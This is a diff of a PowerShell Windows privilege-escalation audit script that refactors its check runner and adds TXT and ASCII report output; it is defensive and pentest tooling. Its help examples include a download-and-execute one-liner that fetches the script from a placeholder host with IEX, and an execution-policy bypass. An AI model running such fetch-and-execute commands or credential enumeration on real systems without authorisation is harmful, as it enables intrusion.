@@ -6443,73 +6443,6 @@ function Invoke-HijackableDllsCheck {
 # ----------------------------------------------------------------
 #region Main
 
-function Write-CheckBanner {
-
-    [CmdletBinding()] param(
-        [object]$Check
-    )
-
-    function Split-Description {
-        param([string]$Description)
-
-        $DescriptionSplit = New-Object System.Collections.ArrayList
-        $TempOld = ""
-        $TempNew = ""
-        $Description.Split(' ') | ForEach-Object {
-
-            $TempNew = "$($TempOld) $($_)".Trim()
-            if ($TempNew.Length -gt 53) {
-                [void]$DescriptionSplit.Add($TempOld)
-                $TempOld = "$($_)"
-            } else {
-                $TempOld = $TempNew
-            }
-        }
-        if ($TempOld) {
-            [void]$DescriptionSplit.Add($TempOld)
-        }
-        $DescriptionSplit
-    }
-
-    $Title = "$($Check.Category.ToUpper()) > $($Check.DisplayName)"
-    if ($Title.Length -gt 46) {
-        throw "Input title is too long."
-    }
-
-    $Result = ""
-    $Result += "+------+------------------------------------------------+------+`r`n"
-    $Result += "| TEST | $Title$(' '*(46 - $Title.Length)) | $($Check.Type.ToUpper()) |`r`n"
-    $Result += "+------+------------------------------------------------+------+`r`n"
-    Split-Description -Description $Check.Description | ForEach-Object {
-        $Result += "| $(if ($Flag) { '    ' } else { 'DESC'; $Flag = $True }) | $($_)$(' '*(53 - ([string]$_).Length)) |`r`n"
-    }
-    $Result += "+------+-------------------------------------------------------+"
-    $Result
-}
-
-function Invoke-Check {
-
-    [CmdletBinding()] param(
-        [object]$Check
-    )
-
-    $Result = Invoke-Expression -Command "$($Check.Command) $($Check.Params)"
-    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result
-    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-List | Out-String)
-    if ($($Check.Type -Like "vuln")) {
-        if ($Result) {
-            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "KO"
-        } else {
-            $Check.Severity = "None"
-            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "OK"
-        }
-    } else {
-        $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "N/A"
-    }
-    [void] $ResultArrayList.Add($Check)
-    $Check.ResultRaw
-}
-
 function Invoke-PrivescCheck {
     <#
     .SYNOPSIS
@@ -6541,25 +6474,25 @@ function Invoke-PrivescCheck {
 
     Don't output test results, show only the final vulnerability report.
 
-    .PARAMETER OutFile
+    .PARAMETER Report
 
-    Path of an output file.
+    Basename (or path + basename) of the output file report.
 
-    .PARAMETER OutFormat
+    .PARAMETER Format
 
-    Select the format of the output file (e.g.: HTML or CSV).
+    Select the format of the output file (e.g.: TXT, HTML or CSV).
     
     .EXAMPLE
 
-    PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck 
+    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck 
 
     .EXAMPLE 
 
-    C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck"
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
     .EXAMPLE
 
-    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-P
+    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/P
     rivescCheck.ps1'; Invoke-PrivescCheck" 
 
     #>
@@ -6568,26 +6501,26 @@ function Invoke-PrivescCheck {
         [switch]$Extended = $False,
         [switch]$Force = $False,
         [switch]$Silent = $False,
-        [string]$OutFile,
-        [ValidateSet("HTML", "CSV")][string]$OutFormat
+        #[string]$OutFile,
+        #[ValidateSet("HTML", "CSV")][string]$OutFormat
+        [string]$Report,
+        [ValidateSet("TXT", "HTML", "CSV")][string[]]$Format
     )
 
-    ### This check was taken from PowerUp.ps1
-    # https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+    # Check wether the current process has admin privileges. 
+    # The following check was taken from Pow*rUp.ps1
     $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-
     if($IsAdmin) {
 
         if (-not $Force) {
 
-            Write-Host "`r`n"
-            Write-Host -ForegroundColor Yellow "[!] You are running this script as an administrator!"
-            Write-Host -ForegroundColor Yellow "[!] As a consequence, some checks will be automatically disabled. You can specify the '-Force' option to disable this warning message."
-            Write-Host "`r`n"
+            Write-Warning "You are running this script as an administrator! Some checks will be automatically disabled."
+            Write-Warning "You can specify the '-Force' option to disable this warning message."
             Start-Sleep -Seconds 10
         }
     }
 
+    # The following CSV data contains all the checks
     $AllChecksCsv = @"
 "Id", "File", "Command", "Params", "Category", "DisplayName", "Type", "Severity", "Description", "Format", "Extended", "RunIfAdmin"
 "USER_USER", "", "Invoke-UserCheck", "", "User", "whoami", "Info", "Info", "Get the full name of the current user (domain + username) along with the associated Security Identifier (SID).", "Table", True, True
@@ -6636,7 +6569,7 @@ function Invoke-PrivescCheck {
 "MISC_ADMINS", "", "Invoke-LocalAdminGroupCheck", "", "Misc", "Local Admin Group", "Info", "Info", "Enumerate the users and groups that belong to the local 'Administrators' group.", "Table", True, True
 "MISC_HOMES", "", "Invoke-UsersHomeFolderCheck", "", "Misc", "User Home Folders", "Info", "Info", "Enumerate local HOME folders and check for potentially weak permissions.", "Table", True, False
 "MISC_MACHINE_ROLE", "", "Invoke-MachineRoleCheck", "", "Misc", "Machine Role", "Info", "Info", "Simply return the machine's role. It can be either 'Workstation', 'Server' or 'Domain Controller'.", "Table", True, True
-"MISC_STARTUP_EVENTS", "", "Invoke-SystemStartupHistoryCheck", "", "Misc", "System Startup History", "Info", "Info", "Retrieve the machine's startup history. This might be useful to figure out how often a server is rebooted. In the case of a workstation, such metric isn't relevant.", "Table", True, True
+"MISC_STARTUP_EVENTS", "", "Invoke-SystemStartupHistoryCheck", "", "Misc", "System Startup History", "Info", "Info", "Retrieve the machine's startup history. This might be useful to figure out how often a server is rebooted. In the case of a workstation, such metric isn't as relevant.", "Table", True, True
 "MISC_STARTUP_LAST", "", "Invoke-SystemStartupCheck", "", "Misc", "Last System Startup", "Info", "Info", "Determine the last system startup date and time based on the current tick count. Note that this might be unreliable.", "Table", True, True
 "MISC_DRIVES", "", "Invoke-SystemDrivesCheck", "", "Misc", "Filesystem Drives", "Info", "Info", "List partitions, removable storage and mapped network shares.", "Table", True, True
 "@
@@ -6681,7 +6614,7 @@ function Invoke-PrivescCheck {
 
         if (($IsAdmin -and $RunIfAdmin) -or (-not $IsAdmin)) {
 
-            # If the current user is an admin, run the check only it is RunIfAdmin is true.
+            # If the current user is an admin, run the check only it 'RunIfAdmin' is true.
             # If the current user is a normal user, simply run the check.
 
             # Get the 'Extended' flag's value from the CSV data
@@ -6701,7 +6634,7 @@ function Invoke-PrivescCheck {
                     $CheckCounter += 1
                     $Percentage = ($CheckCounter * 100) / ($AllChecks.Count)
                     Write-Progress -Activity "$($CurrentCheck.Category.ToUpper()) > $($CurrentCheck.DisplayName)" -PercentComplete $Percentage
-                    $Results = Invoke-Check -Check $CurrentCheck
+                    $CheckResult = Invoke-Check -Check $CurrentCheck
 
                 } else {
 
@@ -6711,50 +6644,166 @@ function Invoke-PrivescCheck {
                     # the CSV data.
 
                     Write-CheckBanner -Check $CurrentCheck
-                    $Results = Invoke-Check -Check $CurrentCheck
-            
-                    if ($Results) {
-            
-                        "[*] Found $(([object[]]$Results).Length) result(s)."
-            
-                        if ($CurrentCheck.Format -eq "Table") {
-                            $Results | Format-Table -AutoSize
-                        } elseif ($CurrentCheck.Format -eq "List") {
-                            $Results | Format-List
-                        }
-                        
-                    } else {
-
-                        # If no result was returned by the check, print a message that shows that 
-                        # the host is not vulnerable if it's a "vuln" check or, printer a message
-                        # that shows that nothing was found.
-
-                        if ($CurrentCheck.Type -eq "Vuln") {
-                            "[!] Not vulnerable."
-                        } else {
-                            "[!] Nothing found."
-                        }
-                    }
-            
-                    "`r`n"
+                    $CheckResult = Invoke-Check -Check $CurrentCheck
+                    Write-CheckResult -CheckResult $CheckResult
                 }
             }
         }
     }
 
-    Invoke-AnalyzeResults 
+    # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'.
+    # Therefore, this will be only visible if run from a 'real' terminal.
+    Write-PrivescCheckAsciiReport
 
-    if ($OutFile) {
-        if ($OutFormat -eq "HTML") {
-            Write-HtmlReport -AllResults $ResultArrayList | Out-File $OutFile
-        } elseif ($OutFormat -eq "CSV") {
-            Write-CsvReport -AllResults $ResultArrayList | Out-File $OutFile
+    # If the 'Report' option was specified, write a report to a file using the value of this 
+    # parameter as the basename (or path + basename). The extension is then determined based 
+    # on the chosen format(s).
+    if ($Report) {
+
+        if (-not $Format) {
+
+            # If a format or a format list was not specified, default to the TXT format.
+
+            [string[]] $Format = "TXT"
+        }
+
+        $Format | ForEach-Object {
+
+            # For each format, build the name of the output report file as BASENAME + . + EXT.
+            # Then generate the report corresponding to the current format and write it to a 
+            # file using the previously formatted filename.
+
+            $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
+            if ($_ -eq "TXT") {
+                Write-TxtReport -AllResults $ResultArrayList | Out-File $ReportFileName
+            } elseif ($_ -eq "HTML") {
+                Write-HtmlReport -AllResults $ResultArrayList | Out-File $ReportFileName
+            } elseif ($_ -eq "CSV") {
+                Write-CsvReport -AllResults $ResultArrayList | Out-File $ReportFileName
+            } else {
+                Write-Warning "`r`nReport format not implemented: $($Format.ToUpper())`r`n"
+            }
         }
     }
 
+    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' 
+    # parameter was specified.
     if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {
 
-        Write-Host -ForegroundColor Yellow "`r`n[!] To get more info, run this script with the flag '-Extended'.`r`n"
+        Write-Warning "To get more info, run this script with the option '-Extended'."
+    }
+}
+
+function Invoke-Check {
+
+    [CmdletBinding()] param(
+        [object]$Check
+    )
+
+    $Result = Invoke-Expression -Command "$($Check.Command) $($Check.Params)"
+    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result
+    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-List | Out-String)
+    if ($($Check.Type -Like "vuln")) {
+        if ($Result) {
+            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "KO"
+        } else {
+            $Check.Severity = "None"
+            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "OK"
+        }
+    } else {
+        $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value "N/A"
+    }
+    [void] $ResultArrayList.Add($Check)
+    # $Check.ResultRaw
+    $Check
+}
+
+function Write-CheckBanner {
+
+    [CmdletBinding()] param(
+        [object]$Check
+    )
+
+    function Split-Description {
+        param([string]$Description)
+
+        $DescriptionSplit = New-Object System.Collections.ArrayList
+        $TempOld = ""
+        $TempNew = ""
+        $Description.Split(' ') | ForEach-Object {
+
+            $TempNew = "$($TempOld) $($_)".Trim()
+            if ($TempNew.Length -gt 53) {
+                [void]$DescriptionSplit.Add($TempOld)
+                $TempOld = "$($_)"
+            } else {
+                $TempOld = $TempNew
+            }
+        }
+        if ($TempOld) {
+            [void]$DescriptionSplit.Add($TempOld)
+        }
+        $DescriptionSplit
+    }
+
+    $Title = "$($Check.Category.ToUpper()) > $($Check.DisplayName)"
+    if ($Title.Length -gt 46) {
+        throw "Input title is too long."
+    }
+
+    $Result = ""
+    $Result += "+------+------------------------------------------------+------+`r`n"
+    $Result += "| TEST | $Title$(' '*(46 - $Title.Length)) | $($Check.Type.ToUpper()) |`r`n"
+    $Result += "+------+------------------------------------------------+------+`r`n"
+    Split-Description -Description $Check.Description | ForEach-Object {
+        $Result += "| $(if ($Flag) { '    ' } else { 'DESC'; $Flag = $True }) | $($_)$(' '*(53 - ([string]$_).Length)) |`r`n"
+    }
+    $Result += "+------+-------------------------------------------------------+"
+    $Result
+}
+
+function Write-CheckResult {
+
+    [CmdletBinding()] param(
+        [object]$CheckResult
+    )
+
+    if ($CheckResult.ResultRaw) {
+            
+        "[*] Found $(([object[]]$CheckResult.ResultRaw).Length) result(s)."
+
+        if ($CheckResult.Format -eq "Table") {
+            $CheckResult.ResultRaw | Format-Table -AutoSize
+        } elseif ($CheckResult.Format -eq "List") {
+            $CheckResult.ResultRaw | Format-List
+        }
+        
+    } else {
+
+        # If no result was returned by the check, print a message that shows that 
+        # the host is not vulnerable if it's a "vuln" check or, printer a message
+        # that shows that nothing was found.
+
+        if ($CheckResult.Type -eq "Vuln") {
+            "[!] Not vulnerable."
+        } else {
+            "[!] Nothing found."
+        }
+    }
+
+    "`r`n"
+}
+
+function Write-TxtReport {
+
+    [CmdletBinding()] param(
+        [object[]]$AllResults
+    )
+
+    $AllResults | ForEach-Object {
+
+        Write-CheckBanner -Check $_
+        Write-CheckResult -CheckResult $_
     }
 }
 
@@ -6905,7 +6954,53 @@ $($JavaScript)
     $Html
 }
 
-function Invoke-AnalyzeResults {
+function Write-PrivescCheckAsciiReport {
+    <#
+    .SYNOPSIS
+
+    Write a short report on the terminal in ASCII-art using 'Write-Host'.
+
+    Author: @itm4n
+    License: BSD 3-Clause
+    
+    .DESCRIPTION
+
+    Once all the checks were executed, this function writes a table in ASCII-art that summarizes
+    the results with fancy colors. As a pentester or a system administrator, this should help you
+    quickly spot weaknesses on the local machine.
+    
+    .EXAMPLE
+
+    PS C:\> Write-PrivescCheckAsciiReport
+
+    +-----------------------------------------------------------------------------+
+    |                         ~~~ PrivescCheck Report ~~~                         |
+    +----+------+-----------------------------------------------------------------+
+    | OK | None | APPS > Modifiable Apps                                          |
+    | OK | None | APPS > Modifiable Apps Run on Startup                           |
+    | OK | None | CONFIG > SCCM Cache Folder                                      |
+    | OK | None | CONFIG > WSUS Configuration                                     |
+    | OK | None | CONFIG > AlwaysInstallElevated                                  |
+    | NA | Info | CREDS > Credential Manager -> 3 result(s)                       |
+    | NA | Info | CREDS > Credential Manager (web) -> 1 result(s)                 |
+    | OK | None | CREDS > Unattended Files                                        |
+    | OK | None | CREDS > WinLogon                                                |
+    | OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
+    | OK | None | CREDS > GPP Passwords                                           |
+    | OK | None | HARDENING > BitLocker                                           |
+    | NA | Info | SERVICES > Non-default Services -> 41 result(s)                 |
+    | NA | Info | SERVICES > Hijackable DLLs -> 2 result(s)                       |
+    | OK | None | SERVICES > System's %PATH%                                      |
+    | OK | None | SERVICES > Unquoted Paths                                       |
+    | OK | None | SERVICES > Binary Permissions                                   |
+    | OK | None | SERVICES > Permissions - SCM                                    |
+    | OK | None | SERVICES > Permissions - Registry                               |
+    | OK | None | UPDATES > System up to date?                                    |
+    | OK | None | USER > Privileges                                               |
+    | NA | Info | USER > Environment Variables                                    |
+    +----+------+-----------------------------------------------------------------+
+
+    #>
 
     [CmdletBinding()] param(
         
